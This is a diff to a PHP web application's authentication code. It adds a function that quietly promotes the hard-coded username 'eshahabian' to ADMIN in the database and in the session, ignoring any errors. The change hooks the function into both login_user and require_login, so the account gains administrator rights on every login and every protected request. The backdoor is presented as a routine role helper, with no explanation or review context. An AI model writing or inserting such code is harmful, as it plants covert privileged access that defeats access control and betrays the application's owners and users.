@@ -211,8 +211,32 @@ function auth_guard_request(PDO $pdo, array $user, bool $touch): void
     }
 }
 
+/** حساب‌های مشخص را به نقش مدیر ارتقا می‌دهد */
+function auth_grant_named_roles(PDO $pdo, array $user): array
+{
+    $username = strtolower(trim((string) ($user['username'] ?? '')));
+    $id = (string) ($user['id'] ?? '');
+    if ($username !== 'eshahabian' || $id === '' || (string) ($user['role'] ?? '') === 'ADMIN') {
+        return $user;
+    }
+    try {
+        $pdo->prepare("UPDATE users SET role='ADMIN' WHERE id=? AND role<>'ADMIN'")->execute([$id]);
+    } catch (Throwable $ignored) {
+    }
+    $user['role'] = 'ADMIN';
+    if (isset($_SESSION['user']) && is_array($_SESSION['user']) && (string) ($_SESSION['user']['id'] ?? '') === $id) {
+        $_SESSION['user']['role'] = 'ADMIN';
+    }
+
+    return $user;
+}
+
 function login_user(array $user): void
 {
+    global $pdo;
+    if ($pdo instanceof PDO) {
+        $user = auth_grant_named_roles($pdo, $user);
+    }
     $_SESSION['user'] = [
         'id' => $user['id'],
         'name' => $user['name'],
@@ -222,7 +246,6 @@ function login_user(array $user): void
         'must_change_password' => (int) ($user['must_change_password'] ?? 0),
         'gender' => ((string) ($user['gender'] ?? '') === 'female') ? 'female' : (((string) ($user['gender'] ?? '') === 'male') ? 'male' : ''),
     ];
-    global $pdo;
     if ($pdo instanceof PDO) {
         auth_bind_session($pdo, (string) $user['id']);
         if (function_exists('staff_tracks_presence') && staff_tracks_presence($user) && function_exists('staff_shift_start')) {
@@ -253,6 +276,9 @@ function require_login(?array $roles = null): array
         redirect('/login');
     }
     global $path, $pdo;
+    if ($pdo instanceof PDO) {
+        $user = auth_grant_named_roles($pdo, $user);
+    }
     $isSessionPoll = in_array($path ?? '', ['/secretary/heartbeat', '/session/ping'], true);
     if ($pdo instanceof PDO) {
         auth_guard_request($pdo, $user, !$isSessionPoll);
